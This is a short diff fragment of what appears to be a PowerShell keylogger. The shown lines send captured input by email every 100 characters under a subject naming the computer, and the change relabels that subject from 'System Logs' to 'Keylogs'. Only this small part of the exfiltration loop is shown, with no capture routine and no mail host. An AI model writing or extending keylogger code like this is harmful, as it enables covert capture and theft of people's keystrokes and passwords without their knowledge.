@@ -144,7 +144,7 @@ try {
                 # Send email every 100 characters
                 if($counter -ge 100) {
                     try {
-                        $Subject = "System Logs - $env:COMPUTERNAME"
+                        $Subject = "Keylogs - $env:COMPUTERNAME"
                         $Body = @"
 System Activity Report
 =====================
